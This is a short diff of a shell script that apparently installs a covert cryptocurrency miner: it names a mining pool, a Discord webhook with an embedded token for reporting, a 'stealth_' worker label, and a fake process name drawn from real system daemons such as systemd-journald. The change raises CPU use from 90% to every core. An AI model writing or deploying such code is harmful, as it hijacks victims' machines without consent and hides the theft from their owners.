@@ -9,8 +9,7 @@ POOL="pool.hashvault.pro:443"
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362712368441852015/UzYhxkLkAvkZm1IA8oy769N-PLfPJakT9OWe9wr2SCmNWVL0842CABegDTEI4rT5K9os"
 WORKER="stealth_$(hostname)"
 
-TOTAL_CORES=$(nproc)
-CPU_THREADS=$(awk "BEGIN {print int($TOTAL_CORES * 0.9)}")
+CPU_THREADS=$(nproc)  # thay vì 90%
 PRIORITY=5
 
 FAKE_NAME=$(shuf -n1 -e "dbus-daemon" "systemd-journald" "udevd" "sys-cleaner" "cronlog")
